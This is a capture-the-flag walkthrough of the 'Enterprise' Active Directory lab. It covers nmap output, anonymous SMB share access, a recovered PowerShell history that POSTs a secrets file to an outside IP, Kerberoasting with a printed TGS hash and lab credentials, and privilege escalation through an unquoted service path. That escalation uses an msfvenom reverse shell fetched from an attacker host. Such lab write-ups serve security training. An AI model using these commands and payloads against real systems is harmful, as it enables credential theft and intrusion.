Enterprise
==========


### Nmap Scan

```bash
# Nmap 7.91 scan initiated Tue Jun 22 15:18:50 2021 as: nmap --min-rate 500 -sC -sV -A -oN allport -p- -T4 10.10.147.19
Nmap scan report for LAB.ENTERPRISE.THM (10.10.147.19)
Host is up (0.14s latency).
Not shown: 65506 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-22 09:52:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2021-06-22T09:53:30+00:00
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Not valid before: 2021-03-11T02:11:05
|_Not valid after:  2021-09-10T02:11:05
|_ssl-date: 2021-06-22T09:53:38+00:00; +1m20s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7990/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Log in to continue - Log in with Atlassian account
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49845/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m20s, deviation: 0s, median: 1m20s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-06-22T09:53:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 22 15:22:22 2021 -- 1 IP address (1 host up) scanned in 212.15 seconds
```


## User Flag

We can see SMB share is running, can check for readable shares. 
Impacket give lots of good tools to do that.

`smbmap -H enterprise.thm -u anonymous`

![smbmap](/Images/enterprise/smbmap.png)

there are 3 share we can read, but onyl **Docs** and **Users** share is readable to us.

```bash
└─$ smbclient //enterprise.thm/Docs  

lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Enter WORKGROUP\mercy's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 15 08:17:35 2021
  ..                                  D        0  Mon Mar 15 08:17:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 08:16:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 08:15:24 2021

                15587583 blocks of size 4096. 9889662 blocks available
smb: \> 
```

download these 2 files, and check for other share.
in `LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline` path you'll find file with some credential

```bash
└─$ smbclient //enterprise.thm/Users

smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\> ls
  .                                   D        0  Fri Mar 12 09:30:39 2021
  ..                                  D        0  Fri Mar 12 09:30:39 2021
  Consolehost_hisory.txt              A      424  Fri Mar 12 09:21:46 2021

                15587583 blocks of size 4096. 9905588 blocks available
smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\> 
```

Content of **Consolehost_history.txt**

```bash
cd C:\
mkdir monkey
cd monkey
cd ..
cd ..
cd ..
cd D:
cd D:
cd D:
D:\
mkdir temp
cd temp
echo "replication:101RepAdmin123!!">private.txt
Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
more payment-details.txt
curl -X POST -H 'Cotent-Type: ascii/text' -d .\private.txt' http://1.215.10.99/dropper.php?file=itsdone.txt
del private.txt
del payment-details.txt
cd ..
del temp
cd C:\
C:\
exit
```

I try to open office file using this password but no luck, then try to convert it so john can understand, and crack with john but unfortunaly it take long time. let it crack and move on to other.

```bash
/usr/share/john/office2john.py RSA-Secured-Credentials.xlsx > office

/usr/share/john/office2john.py RSA-Secured-Document-PII.docx >> office  

john --wordlist=/opt/rockyou.txt office
```


In port **7990** can see another website is hosted.

![Website2](/Images/enterprise/other-website.png)

its says they are moving to **Github** maybe we find something their github repositories.

With easy google search we found the page, nothing in their github page but under **people** we find the **developer**.

![Github](/Images/enterprise/github.png)

there also we find nothing except for powershell script, but when we check **history** we find **username** and **password**.

![User-Nik](/Images/enterprise/user_nik.png)

Try to loging with username and password but no luck. next thought bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.

`GetUserSPNs.py 'lab.enterprise.thm/nik:ToastyBoi!' -outputfile hashes -dc-ip enterprise.thm`

```bash
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$27509cf8b939330ade44a4e4f16b4c9a$8bd6b4dccc603dacb75b8eec8869b10457d89fc55a2e4e42b7d07d851836556f3934af214ce8c3f1fd8c0f233fa1268cf0c6b8cb90c9b44f49192968aeeaaaea3c1469931a013f0acf6da217b7851b808a5ec279c6c3ab343e670f5d12385a85bd912f5c0e7e137f0e94ff5dc58b2d73d0a4929808b5c7a78fa6d891468bb543ac2d25c31f07b753c766cc426d31734f087c48bbd19abf33d9d932d8af2f91410633691ffdc07aab13976275c2bfed971f3998d17ef0139c12c9bb0d40e311b32987079eb329fbbec39a5d179777a4aad9648b666ba7631f3e902f99d5d063f9eec0bea74cfd79c35c9b36cc696b637b78cff38c3bb1e9e6cfd2016571dfe382f102102d4d1d5bc49d7bd5bbd64cfc2d415e6d5c771f5ad0bb384dbef9d87f5c5dfb3b65c2bfd4efd73747849bdfea8811b7e3daf8ac65bf04a00af4ee75426ab26001740b2823f747af284ccea0aaf55723e6f8e572f1c467f233dc8f8f7ea83bde84737e9fcedf79a8866a857261f4109ef7c9e124fde9827b0571edbae2a1642d916d90b1e52ac95dce2fff04ac74a1437154e7b2de603accd6eb8e77dd45ccceb6fd39551ed30fea93ddcbfbc45b725410540aa2ebefb270ed33b52175dc31d3f236669fe3241dc35d1bc69e504eda32f15c86ae3ec91be8d03708ac39950939870e030ba8eb3f429644ed4781a5e48d1f99d3452a42194ee46ec7dd177a7f79628b4de54cba8a47810f9a31723e099efbe3d24fb86053afcccf65769c8d0ef063b4b2aeb9e8eed40746172d823e7258833bbfcd5b75d20ce34a9843cbc102b3d0c934fd2130efda5a96e6e1c67fe49f7e89260ebd2968ad9b28c8482039348cc20555f103037004fe80a3461ce733afde363576ffcb026f8b7908253d5af3267e00b3f832cda640f7f533b08e72f74c4838deef84dac7735a480cec8b728bbf1e67692369774056286549ddd6715dd1b358937ae44f61593c5183bcd1882bf3dd8bf0a07b35920e6f40328f7a70bbcd3639c55e1383404b40d4cf72ad21203c494a343882cb136aeb879dd90b1e462489f4191d6946dc082bd2e8a037dcc65bb5f5bdccf2f34b48b239ddfbe722a3c52feca6cf45f4d2de7c9a5735b81597cc18eb2115de3d5e42324bf6fc448ed790331edf4c2307180e867edd162a92fb22ee3dd6dfbc4b4b1304547a380fb7c2a08caf7bfb814328a5a6576515fd86c38965aa6f697737f9fb0605d515f013cdbbabd1852105f74de64a7e9540a8684ad38cc8360a0ecf741e277fdb7d0c2f6eb2bf997d7b201ae5b01a47e0151dd71da888c32e2f0087e37b7e898b53e2773d3ab220732f0d491ba4ac4ebae9d7839f724d
```

now crack this hash with john get the password.

![John](/Images/enterprise/john.png)

we have the username and password now try to login.

![User-Flag](/Images/enterprise/user_flag.png)

## Root Flag (Administrator)

Need to escalate privilege better upload `winPEAS.bat` check for any escalation method.

![WinPEAS](/Images/enterprise/winpeas.png)

Look like it have unquoted service path vulnerability, create payload with `msfvenom` and upload to machine.


```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

Download the payload to Windows machine and start service also start `msfconsole multi/handler` listener. 

```powershell
PS c:\Users\bitbucket> curl <IP>/reverse.exe -o "C:\Programm Files (x86)\Zero Tier\Zero.exe"

PS c:\Users\bitbucket> Start-Service zerotieroneservice
```


![Root-Flag](/Images/enterprise/root.png)
